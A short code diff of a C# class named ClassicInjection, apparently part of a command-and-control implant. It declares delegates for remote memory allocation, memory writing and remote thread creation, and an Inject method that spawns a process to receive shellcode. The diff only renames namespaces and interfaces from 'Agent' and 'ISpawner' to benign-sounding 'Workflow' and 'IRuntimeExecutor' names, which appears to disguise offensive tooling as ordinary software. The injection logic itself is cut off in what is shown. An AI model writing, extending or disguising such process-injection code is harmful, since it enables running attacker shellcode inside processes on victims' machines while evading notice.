@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using Invoker.Data;
@@ -7,11 +7,11 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
-using Agent.Interfaces;
-using Agent.Models;
+using Workflow.Contracts;
+using Workflow.Models;
 using Microsoft.Win32.SafeHandles;
 
-namespace Agent
+namespace Workflow
 {
     internal class ClassicInjection : ITechnique
     {
@@ -19,7 +19,7 @@ namespace Agent
         private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
         private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
         private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);
-        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
+        async Task<bool> ITechnique.Inject(IRuntimeExecutor spawner, SpawnOptions spawnOptions, byte[] shellcode)
         {
             if (!await spawner.Spawn(spawnOptions))
             {
